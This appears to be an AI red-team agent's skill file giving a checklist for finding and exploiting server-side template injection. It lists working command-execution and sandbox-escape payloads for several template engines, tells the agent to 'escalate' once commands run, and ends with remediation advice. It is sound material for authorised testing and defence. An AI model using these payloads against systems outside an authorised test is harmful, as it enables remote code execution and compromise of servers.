---
name: ssti-testing
description: Server-side template injection detection, engine identification, and RCE
origin: RedteamOpencode
---

# Server-Side Template Injection (SSTI) Testing

## When to Activate

- User input rendered in dynamic templates (emails, PDFs, pages)
- Reflected input shows template-like behavior
- Error messages reveal template engine names or syntax

## Tools

- run_tool curl / Burp Suite Repeater
- tplmap (automated SSTI exploitation)
- SSTImap
- Custom polyglot payloads

## Methodology

### 1. Detect Template Injection

- [ ] Inject math probe: `{{7*7}}` — look for `49` in response
- [ ] Alternate syntaxes: `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{7*7}`, `[= 7*7 ]`
- [ ] String concat: `{{'foo'+'bar'}}` → `foobar`
- [ ] Polyglot: `${{<%[%'"}}%\.`  — observe which causes errors
- [ ] Check URL params, POST body, headers, cookie values

### 2. Identify Template Engine

#### Jinja2 / Python

- [ ] `{{config}}` — dumps Flask config
- [ ] `{{config.items()}}` — enumerate settings
- [ ] `{{self.__class__.__mro__}}` — MRO chain
- [ ] `{{request.application.__globals__}}`

#### Twig / PHP

- [ ] `{{_self.env.getFilter('id')}}` (Twig <2)
- [ ] `{{['id']|filter('system')}}` (Twig 3)
- [ ] `{{app.request.server.all|join(',')}}` — server vars

#### Freemarker / Java

- [ ] `${7*7}` → `49`
- [ ] `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- [ ] `${object.class.forName("java.lang.Runtime")}`

#### Pebble / Java

- [ ] `{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}`

#### Thymeleaf / Java

- [ ] `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x`
- [ ] URL path-based injection in Spring Boot

#### ERB / Ruby

- [ ] `<%= 7*7 %>` → `49`
- [ ] `<%= system('id') %>`
- [ ] `<%= `id` %>`

#### Smarty / PHP

- [ ] `{php}echo `id`;{/php}` (Smarty <3)
- [ ] `{system('id')}`

### 3. Exploitation — RCE

- [ ] Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- [ ] Twig: `{{['id']|filter('system')}}`
- [ ] Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- [ ] ERB: `<%= `whoami` %>`
- [ ] Confirm with `id`, `whoami`, then escalate

### 4. Sandbox Escape

- [ ] Jinja2: walk MRO to find `subprocess.Popen` or `os.popen`
- [ ] Restricted engines: enumerate available objects and methods
- [ ] Chain gadgets through `__subclasses__()`, `__globals__`, `__builtins__`

### 5. Blind SSTI

- [ ] Time-based: inject sleep or heavy computation
- [ ] Out-of-band: DNS/HTTP callback from template execution
- [ ] Error-based: force errors that leak data

## What to Record

- Parameter and endpoint where SSTI confirmed
- Template engine and version identified
- Proof payload and output
- Whether sandbox was present and bypassed
- RCE achieved (yes/no) with evidence
- Severity: Critical (RCE) or High (info leak)
- Remediation: use logic-less templates, sandbox, never pass raw user input to template render
